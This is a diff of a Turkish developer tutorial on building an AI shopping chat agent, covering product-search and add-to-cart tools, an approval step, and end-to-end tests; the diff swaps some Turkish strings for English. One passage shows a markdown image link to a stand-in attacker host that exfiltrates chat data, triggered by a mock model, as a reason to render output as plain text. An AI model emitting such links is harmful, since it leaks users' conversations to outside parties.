@@ -37,7 +37,7 @@ Başlangıç klasöründeki `CLAUDE.md` kuralları ajana zaten söylüyor. `data
 src/lib/tools.ts içindeki createTools'u yaz.
 searchProducts: query, maxPrice ve category alsın, src/lib/products.ts'teki findProducts'ı çağırsın.
 addToCart: productId ve 1 ile 5 arası tamsayı quantity alsın, src/lib/cart.ts'teki addItem'ı userId için çağırsın.
-Hata olursa gerçek mesajı sunucuda logla, modele yalnızca "Ürün sepete eklenemedi." dön.
+Hata olursa gerçek mesajı sunucuda logla, modele yalnızca "The product could not be added to the cart." dön.
 ```
 
 İki kural önemli:
@@ -68,14 +68,14 @@ src/components/Chat.tsx içindeki useChat'i kur, src/components/ProductCard.tsx 
 searchProducts sonucu ürün kartları olarak gösterilsin. Karta basınca "<id> sepete ekle" mesajı gitsin.
 addToCart onay beklerken Onayla ve Vazgeç butonları çıksın. Cevap verilince otomatik devam etsin.
 Asistan metnini düz metin olarak göster, markdown render etme.
-Sepet sayısı "Sepet: N ürün" olarak /api/cart'tan gelsin.
+Sepet sayısı "Cart: N items" olarak /api/cart'tan gelsin.
 ```
 
 `useChat` araç parçalarını `tool-<ad>` türüyle verir. Onay beklerken durum `approval-requested` olur ve `addToolApprovalResponse` ile cevap gönderilir.[^4]
 
-Asistan metnini markdown olarak render etmeyin. Modelin yazdığı `![](https://kotu.example/c.png?d=...)` gibi bir görsel adresi, sayfa açılınca tarayıcıyı o adrese götürür ve sohbet verisini dışarı sızdırabilir.[^5] Sahte model, "özet geç" yazdığınızda tam bunu dener.
+Asistan metnini markdown olarak render etmeyin. Modelin yazdığı `![](https://kotu.example/c.png?d=...)` gibi bir görsel adresi, sayfa açılınca tarayıcıyı o adrese götürür ve sohbet verisini dışarı sızdırabilir.[^5] Sahte model, "skip the summary" yazdığınızda tam bunu dener.
 
-**Kontrol:** Uçtan uca testlerde "onay ister", "vazgeçince sepet değişmez" ve "dış görsel için istek atılmaz" yeşil mi? Tarayıcıda `npm run dev` ile de deneyin: `koşu ayakkabısı göster`, sonra bir kartta **Sepete ekle**, sonra **Onayla**.
+**Kontrol:** Uçtan uca testlerde "onay ister", "dismissing leaves the cart unchanged" ve "dış görsel için istek atılmaz" yeşil mi? Tarayıcıda `npm run dev` ile de deneyin: `show me running shoes`, sonra bir kartta **Sepete ekle**, sonra **Onayla**.
 
 ## Adım 4: Sınırları yazdırın
 
